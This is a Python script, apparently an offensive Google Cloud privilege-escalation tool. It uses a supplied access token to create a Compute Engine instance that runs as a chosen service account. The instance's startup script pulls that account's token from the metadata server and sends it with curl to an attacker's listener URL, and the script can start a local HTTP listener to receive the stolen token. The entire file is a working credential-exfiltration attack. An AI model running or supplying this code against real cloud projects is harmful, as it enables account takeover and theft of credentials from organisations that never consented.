#!/usr/bin/env python3

import sys

PROJECT_ID = ''
TARGET_SERVICE_ACCOUNT = ''
ZONE = 'us-central1-f'
INSTANCE_NAME = 'exfil'
ACCESS_TOKEN = input('Enter an access token to use for authentication: ').rstrip()

# Exactly one of these must be specified. Leave the other one as an empty string
# If IP_PORT is specified, the script will automatically setup an HTTP listener on the current server
# If EXFIL_URL is specified, no local HTTP listener will be started
EXFIL_URL = ''  # The HTTP URL of an external listener. Example: http://myserver.tld
IP_PORT = ''  # The IP/port to listen on on the current server. Example: 1.1.1.1:8080
if IP_PORT:
    PORT = IP_PORT.split(':')[1]
    EXFIL_URL = f'http://{IP_PORT}'

if not EXFIL_URL and not IP_PORT:
    print('Exactly one of EXFIL_URL and IP_PORT must be specified.')
    sys.exit(1)

from apiclient.discovery import build
import google.oauth2.credentials
import json
import socketserver
import http.server

credentials = google.oauth2.credentials.Credentials(ACCESS_TOKEN)
service = build(serviceName='compute', version='v1', credentials=credentials)

startup_script = f"""
#!/bin/bash
apt-get update
apt-get install -y curl
curl {EXFIL_URL}/gce_token -d "$(curl http://169.254.169.254/computeMetadata/v1beta1/instance/service-accounts/default/token)"
"""

body = {
    'name': INSTANCE_NAME,
    'machineType': f'zones/{ZONE}/machineTypes/g1-small',
    'metadata': {
        'items': [
            {
                'key': 'startup-script',
                'value': startup_script
            }
        ]
    },
    'networkInterfaces': [
        {
            'accessConfigs': [
                {
                    'type': 'ONE_TO_ONE_NAT',
                    'name': 'External NAT'
                }
            ],
            'network': 'global/networks/default'
        }
    ],
    'serviceAccounts': [
        {
            'email': TARGET_SERVICE_ACCOUNT,
            'scopes': [
                'https://www.googleapis.com/auth/cloud-platform',
                'https://www.googleapis.com/auth/iam'
            ]
        }
    ],
    'disks': [
        {
            'autoDelete': 'true',
            'boot': 'true',
            'type': 'PERSISTENT',
            'initializeParams': {
                'sourceImage': 'projects/debian-cloud/global/images/family/debian-9',
            }
        }
    ]
}

res = service.instances().insert(project=PROJECT_ID, zone=ZONE, body=body).execute()

print(json.dumps(res, indent=4))

if IP_PORT:
    class myHandler(http.server.SimpleHTTPRequestHandler):
       def do_POST(self):
           content_len = int(self.headers.get('Content-Length'))
           post_body = self.rfile.read(content_len).decode()
           print(post_body)
           print('')
           sys.exit(0)
    socketserver.TCPServer.allow_reuse_address = True
    handler = socketserver.TCPServer(('', int(PORT)), myHandler)
    print(f'Web server started at 0.0.0.0:{PORT}.')
    print('Waiting for token...\n')
    handler.handle_request()
else:
    print(f'Instance created. Now wait for the token to show up to {EXFIL_URL}...')
